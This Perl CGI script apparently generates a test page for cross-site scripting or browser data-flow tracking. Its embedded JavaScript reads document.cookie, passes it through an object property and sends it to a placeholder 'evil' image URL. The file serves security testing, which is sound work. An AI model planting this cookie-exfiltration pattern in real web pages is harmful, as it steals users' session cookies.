#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests objects";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		var reportdut = "";
		
		// gets the number of arguments and add it to the reporting
		// variable "reportdut"
		
		var mycookie = $evil;

		var obj = { x : 1, y : 2 };

		obj.x = mycookie;
		
		var url = "$imgevilurl?normal=" + obj;
		document.images[0].src = url;
		
		var url2 = "$imgevilurl?normal=" + obj.x;
		document.images[1].src = url2;
		
		var url3 = "$imgevilurl?normal=" + obj.y;
		document.images[2].src = "$imgevilurl?normal=" + obj.length;
		
    </script>
|;

require "xss_basic_footer.pl";
